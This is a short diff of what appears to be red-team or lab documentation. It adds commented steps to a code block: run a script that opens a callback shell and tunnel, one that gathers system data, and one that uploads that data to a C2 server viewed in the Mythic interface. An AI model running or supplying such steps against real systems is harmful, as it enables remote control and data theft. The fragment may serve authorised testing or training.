@@ -85,7 +85,12 @@
       ![](imgs/Aspose.Words.a8e06003-23b9-4d38-9cbb-45238d31644e.010.png)
 
       ```
+      # build the communication tunnel and callback shell
+      python3 medusa_wins.py
+      # extract system data to a specific location
       python3 setup.py
+      # upload saved data to c2 server --- check under Mythic Interface Files part by specifying Uploads
+      python3 data_ext.py
       ```
 
       
